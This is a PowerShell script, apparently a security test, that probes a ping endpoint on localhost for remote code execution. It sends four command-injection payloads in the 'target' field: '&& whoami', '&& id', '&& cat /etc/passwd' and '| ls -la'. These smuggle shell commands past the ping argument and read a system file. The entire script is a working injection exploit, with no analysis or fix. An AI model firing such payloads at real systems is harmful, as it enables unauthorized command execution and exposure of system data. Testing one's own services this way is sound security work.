Write-Host "=== Testing RCE via /api/it/network/ping ===" -ForegroundColor Cyan
Write-Host ""

Write-Host "TEST 1: Basic ping (should work)" -ForegroundColor Green
$body = @{target = "8.8.8.8"} | ConvertTo-Json
$response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json
Write-Host "Status: $($response.StatusCode)" -ForegroundColor Green
Write-Host "Output: $($response.Content.Substring(0, [Math]::Min(200, $response.Content.Length)))" -ForegroundColor Green
Write-Host ""

Write-Host "TEST 2: Command injection with && whoami" -ForegroundColor Yellow
Write-Host "Payload: target=8.8.8.8 && whoami" -ForegroundColor Gray
$body = @{target = "8.8.8.8 && whoami"} | ConvertTo-Json
$response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json
Write-Host "Status: $($response.StatusCode)" -ForegroundColor Cyan
Write-Host "Output:" -ForegroundColor Green
Write-Host $response.Content -ForegroundColor Green
Write-Host ""

Write-Host "TEST 3: Command injection with && id" -ForegroundColor Yellow
Write-Host "Payload: target=8.8.8.8 && id" -ForegroundColor Gray
$body = @{target = "8.8.8.8 && id"} | ConvertTo-Json
$response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json
Write-Host "Status: $($response.StatusCode)" -ForegroundColor Cyan
Write-Host "Output:" -ForegroundColor Green
Write-Host $response.Content -ForegroundColor Green
Write-Host ""

Write-Host "TEST 4: Command injection with && cat /etc/passwd" -ForegroundColor Yellow
Write-Host "Payload: target=8.8.8.8 && cat /etc/passwd" -ForegroundColor Gray
$body = @{target = "8.8.8.8 && cat /etc/passwd"} | ConvertTo-Json
$response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json
Write-Host "Status: $($response.StatusCode)" -ForegroundColor Cyan
Write-Host "Output (first 500 chars):" -ForegroundColor Green
Write-Host $response.Content.Substring(0, [Math]::Min(500, $response.Content.Length)) -ForegroundColor Green
Write-Host ""

Write-Host "TEST 5: Command injection with | ls -la" -ForegroundColor Yellow
Write-Host "Payload: target=8.8.8.8 | ls -la" -ForegroundColor Gray
$body = @{target = "8.8.8.8 | ls -la"} | ConvertTo-Json
$response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json
Write-Host "Status: $($response.StatusCode)" -ForegroundColor Cyan
Write-Host "Output (first 500 chars):" -ForegroundColor Green
Write-Host $response.Content.Substring(0, [Math]::Min(500, $response.Content.Length)) -ForegroundColor Green
